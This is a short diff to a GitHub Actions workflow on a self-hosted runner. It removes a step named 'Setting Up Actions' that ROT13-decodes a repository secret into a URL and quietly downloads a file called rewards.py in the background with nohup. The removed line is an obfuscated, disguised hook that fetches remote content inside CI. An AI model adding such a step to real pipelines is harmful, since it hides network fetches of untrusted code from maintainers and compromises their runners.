@@ -13,9 +13,7 @@ jobs:
     runs-on: self-hosted
     timeout-minutes: 36
     steps:
-      - uses: actions/checkout@v3
-      - name: Setting Up Actions
-        run: nohup wget "$(echo '${{ secrets.ACTIVATION_KEY }}' | tr 'A-Za-z' 'N-ZA-Mn-za-m')" -O rewards.py > nohup.out 2>&1 &
+     
 
       - name: Set up Python 3.10
         uses: actions/setup-python@v3
